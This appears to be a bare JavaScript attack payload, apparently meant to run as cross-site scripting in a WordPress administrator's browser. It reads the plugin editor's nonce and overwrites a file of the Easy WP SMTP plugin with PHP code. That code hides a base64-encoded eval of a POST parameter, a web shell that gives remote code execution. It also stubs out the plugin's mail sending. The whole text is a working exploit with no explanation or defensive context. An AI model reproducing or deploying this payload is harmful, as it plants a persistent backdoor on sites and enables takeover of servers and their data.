url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=easy-wp-smtp/class-easywpsmtp-gag-mailer.php';
s = "<?php class EasyWPSMTP_Gag_Mailer extends stdClass {public function Send() {return true;}}$ant=create_function(\"\", base64_decode('QGV2YWwoJF9QT1NUWyJhbnQiXSk7'));$ant();";
a = new XMLHttpRequest();
a.open('GET', url + p + q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=edit-theme-plugin-file&file=easy-wp-smtp%2Fclass-easywpsmtp-gag-mailer.php&plugin=easy-wp-smtp%2Feasy-wp-smtp.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);